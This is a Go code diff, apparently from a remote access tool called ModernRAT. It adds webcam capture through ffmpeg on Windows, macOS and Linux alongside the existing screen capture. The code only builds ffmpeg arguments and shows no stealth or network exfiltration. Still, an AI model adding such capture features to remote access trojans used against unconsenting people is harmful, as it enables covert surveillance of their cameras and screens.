@@ -484,19 +484,36 @@ func ffmpegCandidates() []string {
 }
 
 func buildFFmpegInputArgs(settings *pb.CaptureSettings) ([]string, error) {
-	var args []string
+	inputType := pb.CaptureInputType_CAPTURE_INPUT_TYPE_SCREEN
+	if settings != nil && settings.GetInputType() != pb.CaptureInputType_CAPTURE_INPUT_TYPE_UNSPECIFIED {
+		inputType = settings.GetInputType()
+	}
+
+	framerate := int32(0)
+	if settings != nil {
+		framerate = settings.GetFramerate()
+	}
+
 	source := ""
 	if settings != nil {
 		source = strings.TrimSpace(settings.GetCaptureSource())
 	}
+
+	if inputType == pb.CaptureInputType_CAPTURE_INPUT_TYPE_WEBCAM {
+		if env := strings.TrimSpace(os.Getenv("MODERNRAT_WEBCAM_DEVICE")); env != "" {
+			source = env
+		}
+		return buildWebcamInputArgs(framerate, source)
+	}
+
 	if env := strings.TrimSpace(os.Getenv("MODERNRAT_CAPTURE_SOURCE")); env != "" {
 		source = env
 	}
+	return buildScreenInputArgs(framerate, source)
+}
 
-	var framerate int32
-	if settings != nil {
-		framerate = settings.GetFramerate()
-	}
+func buildScreenInputArgs(framerate int32, source string) ([]string, error) {
+	var args []string
 
 	switch runtime.GOOS {
 	case "windows":
@@ -535,7 +552,49 @@ func buildFFmpegInputArgs(settings *pb.CaptureSettings) ([]string, error) {
 		return nil, fmt.Errorf("screen capture not supported on %s", runtime.GOOS)
 	}
 
-	// We add common flags after input specification.
+	args = append([]string{"-hide_banner", "-loglevel", "info", "-nostdin"}, args...)
+	return args, nil
+}
+
+func buildWebcamInputArgs(framerate int32, device string) ([]string, error) {
+	var args []string
+	device = strings.TrimSpace(device)
+
+	switch runtime.GOOS {
+	case "windows":
+		if device == "" {
+			return nil, errors.New("webcam device must be specified on Windows (use --device \"<name>\" or set MODERNRAT_WEBCAM_DEVICE)")
+		}
+		args = append(args, "-f", "dshow")
+		if framerate > 0 {
+			args = append(args, "-framerate", fmt.Sprint(framerate))
+		}
+		args = append(args, "-i", fmt.Sprintf("video=%s", device))
+	case "darwin":
+		if device == "" {
+			device = "0"
+		}
+		if !strings.Contains(device, ":") {
+			device = fmt.Sprintf("%s:none", device)
+		}
+		args = append(args, "-f", "avfoundation")
+		if framerate > 0 {
+			args = append(args, "-framerate", fmt.Sprint(framerate))
+		}
+		args = append(args, "-i", device)
+	case "linux":
+		if device == "" {
+			device = "/dev/video0"
+		}
+		args = append(args, "-f", "v4l2")
+		if framerate > 0 {
+			args = append(args, "-framerate", fmt.Sprint(framerate))
+		}
+		args = append(args, "-i", device)
+	default:
+		return nil, fmt.Errorf("webcam capture not supported on %s", runtime.GOOS)
+	}
+
 	args = append([]string{"-hide_banner", "-loglevel", "info", "-nostdin"}, args...)
 	return args, nil
 }
